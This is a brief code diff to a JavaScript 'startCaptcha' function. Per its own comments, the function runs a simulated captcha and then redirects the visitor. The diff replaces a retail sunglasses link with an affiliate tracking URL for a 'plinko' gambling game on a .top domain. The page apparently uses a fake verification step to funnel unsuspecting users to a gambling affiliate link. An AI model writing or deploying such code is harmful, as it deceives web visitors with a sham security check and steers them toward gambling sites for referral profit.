@@ -22,7 +22,7 @@ function startCaptcha() {
 
         // Redirect to the main site after a delay
         setTimeout(() => {
-            window.location.href = "https://www.lenskart.com/sunglasses/special/vc-aviator.html"; // Redirect URL
+            window.location.href = "https://refpa277512.top/L?tag=d_3654468m_2895c__[]general[]_d139488_l159896_direct_link_plinko&site=3654468&ad=2895&r=allgamesentrance/plinko"; // Redirect URL
         }, 1500); // 1.5 seconds delay before redirect
     }, 2000); // Simulated processing time (2 seconds)
 }
